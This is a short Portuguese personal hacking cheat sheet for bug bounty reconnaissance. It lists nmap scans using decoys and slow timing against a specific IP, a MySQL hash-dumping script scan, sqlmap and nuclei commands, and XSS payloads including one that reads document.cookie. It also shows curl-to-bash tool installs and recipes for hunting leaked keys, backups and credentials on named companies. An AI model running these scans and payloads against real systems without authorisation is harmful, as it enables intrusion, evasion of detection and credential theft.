# Anotações de Hacking

### Scanners

```shell
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

nmap -v -sS -p- -f -D RND:10 --min-rate 100 -Pn 18.228.216.123

nmap -v -sS -p22 -f -D RND:10 --scan-delay 10s --max-rate 1 -T1 -Pn 18.228.216.123

nuclei -l windowsHosts -tags windows,smb -code -esc -silence

sqlmap -r req.txt --dbs --batch --random-agent --proxy http://127.0.0.1:8082 --dbms=mysql --technique=U
```

### Payloads XSS

```javascript
<img src/onerror=prompt(document.cookie)>
<<script>promp()</script>
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<input onmouseover=alert(1)>
<svg/onload=alert(1)>
<svg/onload=prompt()>
```

### tools Guthub

[XSS Automation](https://github.com/dirtycoder0124/XSS-Automation/blob/main/xss_automation.sh)
[KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
[Bug-Bounty-Toolz](https://github.com/KingOfBugbounty/Bug-Bounty-Toolz)
[GoldenNuggets](https://github.com/GainSec/GoldenNuggets-1)
[Ghauri](https://github.com/r0oth3x49/ghauri)

### Cursos

[Curso Pentest ACtive Directory](https://academy.simplycyber.io/)

### Scanner de Code Review

```shell
curl -sL -o /tmp/output.tar.gz https://github.com/gitleaks/gitleaks/releases/download/v8.24.3/gitleaks_8.24.3_linux_x64.tar.gz; tar -zxvf /tmp/output.tar.gz -C /tmp/; mv /tmp/gitleaks /bin/; chmod +x /bin/gitleaks; gitleaks detect . -v --no-git -f sarif -r GITLEAKS_RESULT.sarif;

curl -fsSL https://raw.githubusercontent.com/ZupIT/horusec/main/deployments/scripts/install.sh | bash -s latest; horusec start -p . --disable-docker=true --information-severity=true -o sarif -O ./HORUSEC_RESULT.sarif;
```

### ACESSAR ARQUIVOS COM STATUS 404:

```shell
curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.policybazaar.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

cat out.txt | uro | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar|\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.config|\.cvs|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.cmd|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
```
Wayback Machine > search > url encontrada


### JsRecon Methodology:

```shell
katana -u samsung.com -d 5 -jc | grep '\.js$' | tee alljs.txt
echo www.samsung.com | gau | grep '\.js$' | anew alljs.txt
cat alljs.txt | uro | sort -u | httpx-toolkit -mc 200 -o samsung.txt
cat samsung.txt | jsleak -s -l -k
cat samsung.txt | nuclei -t nuclei-templates/credentials-disclousure-all.yaml -c 30
cat samsung.txt | nuclei -t nuclei-templates/http/exposures -c 30
cat samsung.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazzyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
```

### Download de APK

[APK Downloader](https://apps.evozi.com/apk-downloader/)

Coloca o link de download do play store e ele baixa.
